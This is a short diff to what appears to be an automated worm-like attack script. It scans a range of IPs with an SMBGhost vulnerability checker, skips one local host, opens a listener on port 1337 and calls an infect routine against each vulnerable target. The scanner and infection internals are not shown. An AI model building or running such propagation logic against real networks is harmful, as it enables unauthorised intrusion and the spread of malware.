@@ -3,7 +3,7 @@ import time
 import armory.SMBGhost.cve20220796scanner as cve20220796scanner
 from sniff import sniff
 from infect import infect
-from tunnel import tunnel
+import tunnel as comm
 import sqlite3
 
 
@@ -19,9 +19,9 @@ def main(ip_range):
             for running_port in target_port_details[target_ip.address]["ports"]:
                 #attack = network.is_vulnerable(cur,each_port)
                 attack = cve20220796scanner.is_vulnerable(target_ip.address)
-                if attack:
+                if attack and target_ip.address != "192.168.56.1":
                     listening_port = 1337
-                    tunnel = tunnel("0.0.0.0", listening_port)
+                    tunnel = comm.tunnel("0.0.0.0", listening_port)
                     tunnel.start()
                     
                     infection = infect(target_ip.address,running_port, local_ip, listening_port)
